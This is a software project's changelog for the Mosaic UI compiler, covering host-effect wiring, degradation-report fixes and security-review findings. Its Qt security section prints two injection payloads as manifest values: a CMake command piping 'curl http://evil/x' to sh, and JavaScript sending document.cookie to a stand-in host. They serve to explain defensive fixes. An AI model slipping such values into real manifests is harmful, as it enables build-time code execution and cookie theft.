# Changelog

## Unreleased

### Added — Compose wires a package's `[host_effects]` handler

The third backend, after Qt and SwiftUI.

**No build-list half**, like SwiftUI and unlike Qt. The emitted
`build.gradle.kts` declares no `sourceSets`, so the Kotlin JVM plugin's
convention applies and everything under `src/main/kotlin/` is compiled — which
is where a Compose `[host_effects]` target lands.

**The install goes through a downcast**, immediately after the host is loaded
and before the `Window` that mounts the app. `MosaicComposeHost` is an interface
that deliberately knows nothing about effects; `effectHandler` lives on the
concrete `MosaicRuntimeHost`. `as?` also covers the non-`native-complete` shape,
where the host falls back to `MosaicComposeHostBridge` and there is nothing to
install onto.

#### The anchor is guarded, and honestly described

Line-anchored on `val mosaicHost = remember {`, as on the other backends — but
here that is **defence in depth rather than the load-bearing guard**.

The reason is positional, and the first version of this entry gave a different
one that does not hold. It credited `escape_kotlin_string` turning newlines into
`\n`, which is true of slot defaults, `OneOf` members and the window title — but
`component_name` and slot field names are interpolated **raw** by
`build_compose_root_invocation`, so the escaping is not what makes this safe.
(Those two are constrained by grammar instead: `pascal_case_re` and the mosmodel
`NAME` token admit no newline.) Security review caught it.

What carries the weight is that **nothing author-controlled is emitted before
the anchor**. `build_compose_root_invocation`'s output lands in `MosaicApp`,
emitted after `fun main()`; everything ahead of the anchor line is fixed
scaffolding. Since the search scans forward and takes the first hit, the real
anchor wins even if author text could begin a line.

That property is checkable, so it is now a test rather than a comment —
`no_author_controlled_text_precedes_the_anchor` emits with a findable component
name, slot name and default, and asserts none appears before the anchor. A
future emitter that moved author text above it would otherwise make the
line-anchoring load-bearing with nobody noticing; the mutation fails the test.

SwiftUI is the opposite case, which is why the comments differ: its author text
sits ~270 lines *ahead* of the assignment being anchored on, so there the
anchoring really is the only thing between a slot default and the splice point.

#### An `include` on a Compose handler is refused

Kotlin has no include directive, so the field would be silently dropped — the
shape of failure this section exists to refuse, not a tidy-up. It is a build
error naming the handler.

#### Verified against the real generator, and compiled

- A unit test drives `build_compose_main_kt` in **both** `require_runtime`
  shapes, asserting the flag really selects a different host loader so the loop
  cannot pass twice over identical text.
- A probe package declaring a Compose handler was emitted end to end: the
  install lands at `Main.kt:16`, between the host at `:14` and the `Window` at
  `:17`, and the handler is copied into `src/main/kotlin/` where Gradle compiles
  it.
- The handler and the **emitted install expression, lifted verbatim from the
  generated file rather than retyped**, both type-check with `kotlinc` against
  the real generated `MosaicRuntimeHost.kt` and its `MosaicComposeHost`
  interface. The bytecode confirms the handler binds `setEffectHandler`.

That last step is the one the SwiftUI migration skipped: there the handler was
checked against a hand-written stub whose visibility differed from the real
class, and the actual build rejected it. A stub validates the construct you
thought to model.

Not verified here: `Main.kt` compiling in full, which needs the Compose
toolchain. CI's Compose lane covers it.

#### The classification tripwire worked

Flipping `Backend::Compose` to `true` in `installs_host_effects` immediately
failed the three tests that pinned it as unsupported, which is what sent me back
to update them deliberately. That is the whole argument for an exhaustive match
over a hand-maintained list, and it is the first time it has fired.

### Fixed — four of VisiCalc's five Compose degradations were false positives (#14843)

`table-cell-role` was reported for every backend except React, on the claim that
"authored table-cell roles and wrapper geometry are currently implemented only
by React". Compose emits `collectionItemInfo` for every header, leading and body
cell of a table it recognises, so for those cells the claim is simply untrue.

VisiCalc, Compose: **5 degradations to 1**.

| code | before | after |
| --- | --- | --- |
| `accessibility.authored-table-cell-unimplemented` | 4 | **0** |
| `interaction.table-wheel-shift-unimplemented` | 1 | 1 |

The remaining one is **real and stays**: `grep onViewportShift` in
`mosaic-emit-compose` returns zero, so Compose does not implement wheel routing
at all. Measuring that first is what kept it from being "fixed" as well.

#### The question is about the table, not the cell

Cell semantics come from `compose_semantic_table_shape`, computed on the
enclosing `HostTable` — so a cell cannot be judged from the cell alone. The
degradation walker recursed over children without carrying it, which is why the
arm had to answer with a blanket backend check.

`collect_native_degradations` now threads the nearest enclosing `HostTable`, and
the `table-cell-role` arm asks the same kind of per-backend question the
`HostTable focusable` arm beside it already asked. A cell with no enclosing
table, or in a table Compose does not recognise, is still reported.

Grouping the walk's four invariant arguments into a `NativeScan` struct kept the
recursive function inside clippy's argument limit; the enclosing table was the
eighth.

#### Measured, not assumed

VisiCalc's own `.mll` contains **zero** `HostTable` nodes — it reaches its table
through `pkg::mosaic-pkg-grid::`, so a probe that skips the package resolver
sees nothing. Resolved, there is one table, `host_table_has_native_semantics`
is true for it, and it contains exactly the 4 `table-cell-role` props that were
being reported. The new test builds its fixture through the real resolver for
the same reason.

VisiCalc's render script pinned the count at 5; it now pins 1. Trestle and
Engram remain native-complete with 0.

### Fixed — a `[host_effects]` handler for a backend that cannot install one

`install_host_effects` copies a declared handler's source for **any** backend.
Only two emit the call that reaches it: `qt_main_with_host_effects` and
`swift_app_with_host_effects`. Nothing checked the difference.

So a package declaring `{ backend = "compose", install = "installFoo" }` got the
manifest's blessing — it validates the symbol, and there is a test declaring
exactly that shape — then the file copied into the project, compiled, linked and
shipped, with nothing ever calling it. No missing symbol. No diagnostic.

That is the silent permanent failure this whole section exists to prevent,
reached through the one gap the section did not check. The first symptom is an
`Await` effect arriving with no handler, going unanswered, and the runtime's
gate on nothing-pending disabling snapshot **and** restore for the life of the
process.

Qt and SwiftUI already hard-fail when they cannot find their anchor — a declared
handler with nowhere to go is a build error, not a quiet no-op. This is the same
refusal for the seven backends that have no anchor to look for, and it fires
**before** anything is copied: refusing after writing would leave a file behind
that the next run reads as pre-existing.

#### It gates on the handler, not the file

The first version keyed on `files` and sat below the "no files for this backend"
early return, which closed only half the hole — security review caught it. A
handler declared with **no file of its own** parses clean, because the manifest
checks file-without-handler and not the converse, so it slipped past the early
return entirely.

That is reachable rather than theoretical. `[host_assets]` is a second door into
the same output directory, and a package can ship its handler's implementation
there — where SwiftPM and Gradle compile a directory implicitly — while
declaring the handler in `[host_effects]`. Engram already ships Compose host
assets exactly that way, so the shape is one line of manifest from being live.

#### Why it is a match rather than a list

`Backend::installs_host_effects` is exhaustive, so a new backend variant stops
the crate compiling until someone classifies it. That is the only version of
"remember to update the supported set" that survives contact with a future
change — and the failure this closes came from exactly such an omission.

A companion test pins the other half: that the backends *claiming* to install
really do have an emitter. A backend that claims wrongly would let a dead
handler through for the precise reason the refusal exists.

That test iterates `Backend::ALL` rather than a hand-copied list of the
variants — its first version repeated all nine, which put a blind spot on
exactly the change it exists to catch. A tenth backend forces the match to be
updated, but if it were classified `true` by mistake, a stale nine-element array
would filter straight past it and pass.

Mutation-tested in three directions: removing the refusal fails the refusal
test, falsely marking Compose as installing fails both classification tests, and
re-keying the gate on `files` fails the file-less-handler test.

Found while checking whether Engram's Compose handler could be written ahead of
the Compose emitter wiring. It cannot, and this is why — the handler would have
shipped dead.

### Fixed — emitting twice into the same directory

`generated_files_on_disk` walked the output directory and treated **every file
it found** as something this build generated. That is true only into a clean
directory. Emit twice into the same output — the ordinary local workflow, and
what `create_dir_all` is deliberately tolerant of ("not an error if the
directory already exists, which is the behaviour we want for incremental
rebuilds") — and the previous run's installed host files are still sitting
there, counted as this build's.

One cause, two bugs, and the second is the worse one.

**`install_host_effects` refused the re-run outright.**

```
mosaic-compile pkg … --backend qt --output DIR --emit-project   # ok
mosaic-compile pkg … --backend qt --output DIR --emit-project   # FAILED
io error: host effect target engram_effects.h would replace a generated file
```

Backend-agnostic: reproduced on Qt and SwiftUI. Any package declaring
`[host_effects]` could be emitted exactly once per directory.

**`install_host_assets` reported a replacement that never happened.** Measured
on Engram/compose, which declares host assets and no host effects, so it
survived a re-run to show the symptom:

| | `replacedGeneratedFiles` |
| --- | --- |
| run 1 | `[]` |
| run 2 | `["src/main/kotlin/MosaicHost.kt"]` |

The file it "replaced" was its own output from run 1. This is the more serious
half: `replacedGeneratedFiles` is the field a reviewer reads to see whether a
package has taken over the application boundary, and UI47 §5.5.5 pins its
acceptance assertion to it. A disclosure field that invents a disclosure
degrades the one signal meant to be trustworthy, in the direction that teaches
readers to ignore it.

#### Why no test and no CI lane caught either

Every existing test builds a fresh scratch directory per assertion, and every CI
lane emits into a new `$RUNNER_TEMP`. The bug needs a directory that already has
output, which is precisely the case nothing exercised — and precisely what the
generated README tells people to do.

#### The fix, and what it deliberately does not do

A file counts as this build's if **either** the build wrote it, or it changed
under the build. Two mechanisms, because each covers the other's blind spot.

The write record is kept in `write_file` itself, the single primitive every byte
reaching the output goes through. The directory is also stamped before emission
begins, and a file whose `(mtime, length)` is unchanged since then is excluded;
each file is compared against **its own** earlier stamp rather than a wall-clock
fence, which keeps that half free of clock skew.

**The second mechanism is not redundant, and the first version of this shipped
without it.** Security review pointed out that the `length` half of the stamp is
inert: the emitters are deterministic, so a re-run writes byte-identical content
and lengths match by construction. Mtime was doing the work alone — and on a
1-second-granularity mount (gRPC-FUSE, some NFS and overlay mounts) two
back-to-back builds land in the same tick, at which point *every* generated file
reads as pre-existing and a genuine takeover would be disclosed as `[]`. Content
hashing cannot help here for the same reason the length cannot: the bytes are
supposed to be identical.

Recording in `write_file` rather than having each emitter append to a returned
list is the point, not an implementation detail. That list is where the earlier
false negative came from, and an emitter cannot forget to do something it does
not do.

It stays a directory walk. Replacing the walk with a list the emitters push to
was the obvious fix and is the wrong one: that list is what an earlier bug came
from — `emit_index_file` writes two files and returns one path, so overwriting
the HTML app shell reported nothing — and the walk's whole virtue is catching a
file written by any means. The subtraction removes only files this build did not
touch.

An unreadable stamp counts as **changed**, not unchanged. Over-reporting a
replacement is noise; missing one is the silent false negative the field exists
to prevent.

#### Mutation-tested in both directions

The fix widens what counts as "not generated", so it is pinned against
loosening as well as against reverting:

| mutation | fails |
| --- | --- |
| presence means generated (the old behaviour) | the 2 re-run tests |
| nothing counts as generated | 7 tests, including every replacement-refusal and disclosure test |
| drop the write-record half of the union | `a_file_this_build_wrote_counts_even_if_its_stamp_looks_unchanged` |

Four tests added, covering what no existing test could: a second emit into the
same directory succeeds; a file this build actually wrote is still refused; an
untouched leftover is not generated while a rewritten one is; and a file this
build wrote counts even when its stamp claims otherwise.

One of them was vacuous first time round and is worth recording as such: the
leftover test rewrote its fixture from 23 bytes to 27, so it passed on the inert
`length` half and never exercised the mtime comparison at all. It now rewrites
to the same length with different content, which is the shape a real re-run
produces.

### Added — SwiftUI wires a package's `[host_effects]` handler

The second backend, after Qt. The shapes differ in a way worth recording.

**SwiftUI needs no build-list half.** SwiftPM's generated `Package.swift` gives
the target `path: "Sources/App"` with no explicit `sources:`, so every `.swift`
under it is compiled and a copied file is already in the build. Qt names its
sources and needed `target_sources`; that asymmetry is the whole reason
`[host_effects]` carries a build obligation at all, and it does not apply here.

**The install is guarded by a downcast.** `MosaicHostState` holds its host as
`MosaicHostBridgeObject?` — a protocol that deliberately knows nothing about
effects — while `effectHandler` lives on the concrete `MosaicRuntimeHost`. The
`if let` is also correct rather than merely necessary: when the standard host is
absent the app falls back to a reflection bridge, and there is no host to
install onto then.

The call goes immediately after the host is assigned and before the first props
refresh, which is the first thing that can produce an effect.

Anchored on `self.bridge = ` rather than the whole call, because
`--runtime-library` rewrites it to `MosaicRuntimeHost.load(libraryPath: …)` —
anchoring on the plain form would silently emit no install in exactly the
configuration that ships. A test pins the bundled form, and mutation-testing it
confirms the narrower anchor fails.

**The anchors are pinned against real emission, not only fixtures.** Both
anchors — `class MosaicHostState` and `self.bridge = ` — are incidental details
of `mosaic-emit-swiftui`, free to be renamed by someone who never reads this
crate, and a fixture-only test would keep passing through such a rename while
every real build broke. So `the_anchors_match_a_genuinely_emitted_swiftui_app`
emits a project through the actual pipeline, applies the same runtime-binding
rewrite the build applies, and wires that. Renaming the class in the emitter
fails it.

It covers all four combinations of `require_runtime` × `bundle_runtime`. The
first of those matters more than it looks: the emitter keeps *two* separate
`MosaicHostState` templates and picks between them on `require_runtime`, and the
builder sets that flag for `--profile native-complete` and for any build passing
`--runtime-library` — which is exactly how Engram is built in CI. The first
version of this test exercised only the default, leaving the shipping shape
unpinned. An assertion now also pins that the flag genuinely selects a different
template, so the loop cannot silently run twice over identical text.

Three guards decide where the install lands: the host class is found by its
declaration, the search is scoped to it, and within that the assignment must
begin its line. Each is pinned by its own test, because a fixture that several
guards reject proves only that at least one works. Mutation-testing confirms the
split — each mutation fails exactly one test and leaves the others green:

| mutation | fails |
| --- | --- |
| drop the line-leading requirement | `a_non_line_leading_decoy_inside_the_class_is_skipped` (+2 unit tests) |
| search the whole file, unscoped | `a_line_leading_decoy_before_the_class_is_skipped` |
| find the class with a bare `find` | `a_forged_class_marker_fails_the_build_rather_than_redirecting` |
| prefer the first declaration instead of refusing | `a_forged_class_marker_fails_the_build_rather_than_redirecting` |

The last two coincide because a bare `find` discards both the prefix predicate
and the uniqueness check, and it is uniqueness that the test is really pinning —
which is the point of the paragraph above. Each row was run, not predicted; an
earlier draft of this table attributed the third row to the wrong test.

That third guard is new, and the honest statement of what it buys is narrower
than the one first written here.

`class MosaicHostState` must now be preceded on its line by nothing but Swift
declaration modifiers — but that does **not** make this crate independent of
`mosaic-emit-swiftui`, which is what an earlier draft of this entry claimed. A
security review caught it. `escape_swift_string` passes raw newlines through, so
a package author whose slot default contains `"\npublic final class
MosaicHostState"` puts a line into the generated app with the prefix
`public final ` — accepted by the predicate, exactly like the genuine one. A
forged declaration is byte-identical to a real one. No lexical test separates
them, and a stricter prefix rule would only move the bar again.

So the guarantee is about the failure **direction**, and it comes from requiring
the declaration to be *unique*. A second acceptable declaration is refused rather
than silently preferred, which means the worst a package author can do is fail
their own build loudly — never redirect the install into a location of their
choosing. That is a property of this crate, checkable here, instead of an
assumption about another crate's escaping.

Two tests carry the pair: one asserts the ambiguous app is refused and names both
declarations in the error, the other asserts the predicate *does* accept the
forgery — because the predicate is not what makes this hold, and a test implying
otherwise would mislead the next reader.

Forging the marker alone only *widens* the search window rather than moving the
install, so a one-decoy fixture cannot tell a bare `find` from an anchored one;
the first version of that test passed against the mutation it was written to
catch.

`line_anchored_find` also now uses `is_ascii_whitespace` rather than
`char::is_whitespace`: the Unicode White_Space set includes U+2028, U+2029 and
U+00A0, which Swift does not treat as code whitespace, so accepting them would
let a prefix a compiler reads as content count as indentation.

### Added — Qt wires a package's `[host_effects]` handler

The emitter half of UI47 §5.5, for the first backend. `[host_effects]` parsed
(mosaic-package-manifest) but nothing read it; now Qt does.

Three things happen for a package that declares a Qt handler:

- **`files` are copied** into the backend output directory by
  `install_host_effects`.
- **They are added to the Qt target.** Qt names its sources explicitly —
  `qt_add_executable(… main.cpp)` plus `target_sources(… MosaicHost.cpp
  MosaicHost.h)` — so a file merely copied in is never compiled. That is
  precisely why the section carries a build-source obligation and not only a
  copy: on React and HTML, `[host_assets]` already wires new files in through
  `activate_react_host_asset` and its sibling, but on Qt and XAML nothing does.
- **The generated `main.cpp` installs the handler**, immediately after the host
  is constructed.

Two details that are decisions rather than accidents:

**The install call is anchored on the declaration, not a line number.** The
generated entry point has two shapes — the native-complete one indents four
spaces, the other indents two and wraps the host in `#if MOSAIC_HAS_HOST`.
Inserting after the declaration inherits whichever guard context it is already
in, so the call cannot land outside the `#if` that defines the host, and the
indentation is taken from the declaration rather than assumed.

**The `#include` is guarded exactly when the host is.** Includes are file-scope
only, so it cannot sit beside the call; an unguarded one would compile a header
declaring a function that takes a `MosaicHost` in a build that has none.

Effects raised by the *startup* update are still fail-swept — the host creates
the application in its constructor and settles that update there, before any
handler can exist. UI47 §5.5.4 records that limit and why two-phase construction
across five templates is not worth paying for speculatively.

#### Closed here: the symlink escape this section would have inherited

`install_host_assets` resolves a package-relative source through
`safe_manifest_relative_path`, which is **lexical** — it refuses `..` and
absolute paths, and a symlink at an innocent-looking relative path passes it.
The bytes are then read and copied into the generated project.

`install_host_effects` canonicalises the source and requires it to be inside the
package, the way `load_package_tokens` already does for the style palette. These
files are *compiled and shipped* rather than merely copied, which is what made it
worth closing before the section had a consumer rather than after.

The same gap remains in `install_host_assets`, which is worth closing separately
rather than copying.

Mutation-tested: inserting the install call before the declaration fails the
ordering test, and disabling the containment check fails the symlink test.

#### From the security review of this change

**CMake injection through `[host_effects].files[].target` (critical).** Unlike
`install` and `include`, `target` had no parse-time validation at all — and it
is interpolated into a generated build command, not merely used as a
destination. The emitter's own path check is *lexical*: it refuses `..` and
absolute paths, and newlines and parens are legal in a Unix filename, so

```toml
target = "e.cpp)\nexecute_process(COMMAND sh -c \"curl -s http://evil/x | sh\")\n#"
```

splits into ordinary `Normal` components, passes, and produces syntactically
valid CMake that runs at **configure** time on whoever builds the emitted
project. Lesser variants need no newline at all: `${CMAKE_SOURCE_DIR}`,
`$ENV{…}` and `;` list-splitting all expand from the same slot.

`target` is now shape-checked in `validate_host_effects`, which is the layer
that fixes every backend emitter at once rather than five that each have to
remember. A test asserts the payload is refused, and a second asserts that the
lexical path check *would* have accepted it — so if that check ever grows teeth,
the reason this lives at parse gets re-read rather than deleted.

As a second layer, Qt now emits each target as its own quoted argument rather
than space-joining them. Nothing should reach there needing the quotes; they are
what stops a future loosening of the regex from becoming injection quietly.

**A host-effects file could silently replace a generated one (high).**
`[host_assets]` may replace a generated file and *reports* it through
`DegradationReport::replaced_generated_files` — the signal a reviewer reads to
see that a package took over the application boundary, and what UI47 §5.5.5
pins its acceptance assertion to. `install_host_effects` runs after that pass
and returns only the paths it wrote, so a `target` of `main.cpp` or
`MosaicHost.cpp` would take the boundary over with that field coming back
**empty**.

Refused outright rather than recorded: a `[host_effects]` file is a new build
source by definition, never a replacement. A package that means to replace a
generated file says so in `[host_assets]`, where it is disclosed.

**An `include` could name a header outside the package.** `:` is in the charset
for Dart's `package:` scheme, which also admitted `C:/Users/Public/backdoor.h` —
an absolute path every MSVC-family compiler resolves. Only the one scheme that
needs a colon may carry one now.

Two smaller ones: the `#include` is inserted at the start of its line rather than
at a raw byte offset, matching the care the install call already took; and a
source that resolves inside the package but is not a regular file is refused,
because `fs::read` on a FIFO blocks the build forever rather than failing it.

Mutation-tested: removing the `target` check fails the injection test, and
disabling the containment check fails the symlink test.

#### Round 2, and the twin hole it found

Round 1's six findings are closed. Round 2 confirmed that and answered the scope
question I had asked it: fixing only `[host_effects]` was **defensible but
incomplete**.

`[host_assets]`'s `target` has the same shape hole and reaches two more sinks —
`activate_react_host_asset` prepends `import "./{target}";` to the generated
`main.tsx`, and the HTML one emits `<script src="./{target}">`. A `"` and a `;`
are legal in a Unix filename, so

```toml
target = 'src/x";fetch("http://evil/"+document.cookie);//.ts'
```

becomes executable JavaScript on line 1 of the emitted app — and under Electron,
in a renderer. Capped below the CMake case because a package shipping a `.ts`
host asset can already run JS by putting it *in the file*, but that is precisely
the argument this section already makes for itself: a manifest string defeats any
review that reads files.

The regex is now shared and applied to `[host_assets]`'s `source` and `target`
too. Every one of the 32 host-asset paths this repo actually ships still parses,
and a test pins that list so a future tightening cannot quietly break the corpus.

Also from round 2: the `package:` exemption let a `..` fuse to the scheme, so
`package:../x` satisfied a `split('/')` check that never had a `..` *segment* to
find. The scheme is now stripped before the remainder is validated, which makes
the stated invariant actually hold, and the negative cases have tests —
previously only the positive Dart form did.

Three existing tests moved rather than broke. `MosaicHost.cpp/`,
`MosaicHost.cpp/.` and `./MosaicHost.cpp` used to be driven through a full build
to assert they were *reported* as replacements; they no longer parse, so
allowed-and-disclosed became refused-outright. A companion test pins the new
refusal, and the case-insensitive collision — `mosaichost.cpp`, the one spelling
that still needs the canonical comparison and that a string compare would miss —
stays exactly where it was.

One thing deliberately left: `install_host_assets` still reads its source without
the canonicalise-and-contain check `install_host_effects` now uses, so a symlink
there escapes the package. Closing it means lifting those lines into a shared
helper, which changes behaviour for an existing, shipping section — its own
change, with its own blast radius, rather than a rider on this one.



### Changed — `styleDegradations` now covers SwiftUI as well as XAML (#12022)

The degradation analyzer asks each backend for the style properties its
lowering dropped. Until now only XAML answered, so an empty `styleDegradations`
meant "XAML found nothing" on XAML and "nobody looked" on the other seven.

SwiftUI now answers too. The dispatch is an explicit `match` on the backend
with a commented `_ => {}` arm, so the six that still do not report are visible
in the code rather than implied by an `if backend == Xaml`.

The test asserting that a non-XAML backend reports nothing was inverted rather
than deleted: it now asserts SwiftUI DOES report a `box-shadow` drop, and a
second test keeps the original guarantee for a backend that still has no
reporting (Qt), because conflating "nobody looked" with "nothing was lost" is
what this issue is about. A drop still does not affect `nativeComplete`, and a
test pins that too.

- Report unsupported layout font-size bindings as explicit backend degradations,
  keeping native-complete acceptance honest while React/Electron support lands.

### Fixed — load owner palettes during standalone package composition

Manifest-aware component composition now loads the owning package's scoped
token palette with the same backend selection, precedence, and containment
checks used by full package builds.

### Fixed — qualify same-package component references before composition

Standalone component composition can now receive its owning package identity
and exports. Bare sibling references are qualified before dependency-style
collection and layout inlining, so every backend receives the same resolved
tree.

- Report unsupported native table focus and naming explicitly.

- Diagnose unsupported measured table wheel routing on non-React backends.

### Fixed — XAML layout variants have distinct generated types

Named layouts now suffix their generated XAML partial class, code-behind,
row-view-model helpers, and event union (for example `EngramAppTouch`). This
lets the emitted WinUI project compile every variant side by side without C#
merging two generated files into one type and rejecting hundreds of duplicate
properties and handlers (#14234).

### Added — authored table-cell degradation reporting

- Report unimplemented authored table-cell roles on non-React backends, so
  strict native-complete builds reject unsupported row-header semantics.

### Added — HTML package snapshots activate model-declared slot states

HTML package components now bake each `one-of` slot's deterministic first
member into its owning mosstyle state instead of silently dropping all state
blocks. This matches the generated standalone shell's fallback props and gives
UI49 a package-level regression for the static backend (#14368).

### Added — package styles understand model-declared slot states

Package composition now passes every component's `one-of` slot values into
mosstyle compilation. This applies independently to the parent and each
dependency component, so merged backend-neutral style IR preserves the owning
slot for model-declared states without confusing same-named slots across
package boundaries (UI49, #14299).

### Fixed — Flutter runtimes are staged through the build-hook output

Generated Flutter build hooks now copy the selected prebuilt Mosaic runtime
from the package's `runtime/` directory into `input.outputDirectory` before
registering it as a `DynamicLoadingBundled` code asset. This follows Flutter's
code-asset contract. TaskApp's CI and release workflows also move from Flutter
3.44.0 to the locally verified 3.47.0 toolchain and explicitly enable native
assets, instead of inheriting machine-global Flutter configuration. When
Flutter leaves the registered runtime in its native-assets staging tree, the
TaskApp CI and release lanes now finish installing that exact staged file into
the application bundle before byte and launch validation. This restores
`libmosaic_app.so` in Linux application bundles on fresh hosted runner images
(#14249).

### Changed — SwiftUI radio groups are no longer unconditionally degraded

`property.radio-group-ignored` now consults
`mosaic_emit_swiftui::pipeline::radio_groups_with_native_semantics`, alongside
the Qt, Compose and Flutter predicates it already used. SwiftUI lowers a
qualifying run of sibling radios to a `Picker` (#13007), so the degradation is
reported only for the groups it genuinely cannot resolve.

### Fixed — a `list<list<text>>` slot never read the host

A slot typed as a list of rows fell through the host-binding match to the
*sample* value — a constant — while every neighbouring prop read from the host
correctly. The generated shell therefore compiled, ran, and showed an **empty
table** no matter what the host sent.

Rows are how every table in Mosaic is modelled: Engram's deck list, TaskApp's
project nav. So this was not an exotic corner, it was the one slot shape whose
whole purpose is to carry data, silently bound to nothing.

Adds a nested-list reader (`mosaicStringListList` / `MosaicHostValue.stringListList`)
and the match arm that reaches it.

**The emit report now records when a package overwrites generated files.** New
`DegradationReport::replaced_generated_files` (`replacedGeneratedFiles` in the
JSON), listing generated files a package's `[host_assets]` replaced.

Overwriting them is **supported** — the generated Qt README says so outright:
"Explicit package host assets may replace `MosaicHost.h/.cpp` when specialized
platform integration is required." What was missing is that it happened silently.
Generated code is what loads and calls the library `--runtime-library` bundles,
so overwriting it can leave the selected engine installed and never invoked —
while the report still said `nativeComplete: true` with no degradations. A CI
lane that bundles a runtime, byte-compares the installed copy, and launches the
app could pass every check without executing a line of it.

**Derived from what the build actually wrote, not from a list of filenames.** A
first attempt used a hand-maintained table of runtime-binding paths, and it was
the wrong shape twice over: one entry named a path the builder never emits, and —
worse — overwriting the binding is not the only way to unhook the runtime.
Replacing Qt's `main.cpp` removes the `MosaicHost` construction; replacing
`CMakeLists.txt` drops the `target_sources` line that compiles the binding at
all, leaving it byte-identical on disk and never built. Each is one manifest line,
and each reported an empty list.

`install_host_assets` runs after emission, so the backend directory already holds
what the build produced: a target landing on a file already there is a
replacement. The list is read from disk, not from the accumulated artifact vector
— that vector is a parallel record every emitter must remember to push to, and
two already do not (`emit_index_file` writes `index-shell.html` and `pubspec.yaml`
but returns only one path each, so overwriting the HTML app shell that inlines
every component reported nothing). Reading the directory is the only version that
cannot be reopened by a future emitter forgetting a push.

Collisions are resolved through `fs::canonicalize`, so the filesystem decides
what counts as the same file rather than a guess about the platform —
`mosaichost.cpp` overwrites `MosaicHost.cpp` on macOS and Windows and does not on
Linux, and the report follows suit. The generated file's own name is reported,
not the manifest's spelling, since a consumer checking that the binding survived
looks for `MosaicHost.cpp`.

Kept out of `degradations`/`nativeComplete` for the same reason
`styleDegradations` is: a supported choice, not a backend failing to express
something. A consumer that needs generated code intact asserts the list is empty.

Analysis-only callers (`analyze_package_degradations`) get an empty list — they
emit nothing, so nothing has been replaced, and predicting it would mean
re-deriving the emitter's behaviour, which is the drift this avoids.

Found by putting Engram on the standard ABI: it ships its own `MosaicHost.cpp`
bound to `engram-capi`, and the real package now reports
`["MosaicHost.cpp", "MosaicHost.h"]`. TaskApp declares no Qt host assets, so the
existing native lanes could not have surfaced this.

## [Unreleased] - install application-scoped native persistence (#13519)

All five generated native project shells now install a standard Mosaic runtime
binding scoped to the package name. This gives Compose, SwiftUI, XAML, Flutter,
and Qt independent per-user snapshot files while keeping low-level conformance
bindings ephemeral.

## [Unreleased] - narrow the `HostProgressRing` degradation to also exclude Qt (#13176)

Qt now lowers `HostProgressRing` to a hand-drawn native determinate arc
(`Shape`/`ShapePath`/`PathAngleArc`, `mosaic-emit-qt`) — the last of
the four native backends in this cascade. Narrowed the
`("HostProgressRing", ...)` arm in `collect_native_degradations` from
`!matches!(backend, Backend::Xaml | Backend::Flutter | Backend::Compose)`
to also exclude `Backend::Qt`. Only SwiftUI (tracked separately in
#13206, unbuildable on this dev box) remains.

## [Unreleased] - narrow the `HostProgressRing` degradation to also exclude Compose (#13176)

Compose now lowers `HostProgressRing` to a real native
`CircularProgressIndicator` (`mosaic-emit-compose`). Narrowed the
`("HostProgressRing", ...)` arm in `collect_native_degradations` from
`!matches!(backend, Backend::Xaml | Backend::Flutter)` to also exclude
`Backend::Compose`, matching `Path`'s own per-backend narrowing
pattern. Qt (last — no off-the-shelf circular determinate control,
needs its own research spike) and SwiftUI (tracked separately in
#13206, unbuildable on this dev box) remain.

## [Unreleased] - narrow the `HostProgressRing` degradation to also exclude Flutter (#13176)

Flutter now lowers `HostProgressRing` to a real native
`CircularProgressIndicator` (`mosaic-emit-flutter`). Narrowed the
`("HostProgressRing", ...)` arm in `collect_native_degradations` from
`backend != Backend::Xaml` to also exclude `Backend::Flutter`, matching
`Path`'s own per-backend narrowing pattern. Compose and Qt (last — no
off-the-shelf circular determinate control) remain to narrow in
follow-up PRs.

## [Unreleased] - narrow the `HostProgressRing` degradation to exclude XAML (#13176)

XAML now lowers `HostProgressRing` to a real native `ProgressRing`
(`mosaic-emit-xaml`). Narrowed the `("HostProgressRing", ...)` arm in
`collect_native_degradations` with `backend != Backend::Xaml`, matching
`Path`'s own per-backend narrowing pattern. Flutter, Compose, and Qt
(last — no off-the-shelf circular determinate control) remain to
narrow in follow-up PRs.

## [Unreleased] - degradation plumbing for `HostProgressRing` (#13176)

New `("HostProgressRing", ...)` arm in `collect_native_degradations`:
unconditionally degraded (`primitive.progress-ring-unimplemented`) on
every native backend at registration, exactly matching `HostSwitch`'s
current state and `Path`'s own starting state. Narrow per backend as
each lowering PR lands (XAML first, per the rollout sequence in
#13176 — Flutter, Compose, then Qt last, since Qt has no off-the-shelf
circular determinate control and needs its own research spike).

## [Unreleased] - narrow the `Path` degradation to also exclude Compose (#12028 item 3, UI39)

Compose now lowers `Path`'s `circle`/`line`/`curve` kinds to real
Jetpack Compose vector geometry (`mosaic-emit-compose`). Narrowed the
`("Path", ...)` arm in `collect_native_degradations` from
`!matches!(backend, Backend::Xaml | Backend::Qt | Backend::Flutter)` to
also exclude `Backend::Compose`, matching `HostSlider`'s per-backend
narrowing pattern. Same primitive-level (not per-kind) caveat as the
XAML/Qt/Flutter narrowings: a real build using `kind: arc` on Compose
still hard-errors from the emitter itself. SwiftUI is now the only
native backend still reporting this degradation.

## [Unreleased] - narrow the `Path` degradation to also exclude Flutter (#12028 item 3, UI39)

Flutter now lowers `Path`'s `circle`/`line`/`curve` kinds to real Dart
widget/`CustomPaint` geometry (`mosaic-emit-flutter`). Narrowed the
`("Path", ...)` arm in `collect_native_degradations` from
`!matches!(backend, Backend::Xaml | Backend::Qt)` to
`!matches!(backend, Backend::Xaml | Backend::Qt | Backend::Flutter)`,
matching `HostSlider`'s per-backend narrowing pattern. Same
primitive-level (not per-kind) caveat as the XAML/Qt narrowings: a real
build using `kind: arc` on Flutter still hard-errors from the emitter
itself.

## [Unreleased] - narrow the `Path` degradation to also exclude Qt (#12028 item 3, UI39)

Qt now lowers `Path`'s `circle`/`line`/`curve` kinds to real QML vector
geometry (`mosaic-emit-qt`). Narrowed the `("Path", ...)` arm in
`collect_native_degradations` from `backend != Backend::Xaml` to
`!matches!(backend, Backend::Xaml | Backend::Qt)`, matching
`HostSlider`'s per-backend narrowing pattern. Same primitive-level
(not per-kind) caveat as the XAML narrowing: a real build using
`kind: arc` on Qt still hard-errors from the emitter itself.

## [Unreleased] - narrow the `Path` degradation to exclude XAML (#12028 item 3, UI39)

XAML now lowers `Path`'s `circle`/`line`/`curve` kinds to real vector
geometry (`mosaic-emit-xaml`). Narrowed the `("Path", ...)` arm in
`collect_native_degradations` with `backend != Backend::Xaml`, matching
`HostSlider`'s per-backend narrowing pattern exactly. This is a
primitive-level flag, not per-kind — a real build using the
not-yet-implemented `arc` kind on XAML still hard-errors from the
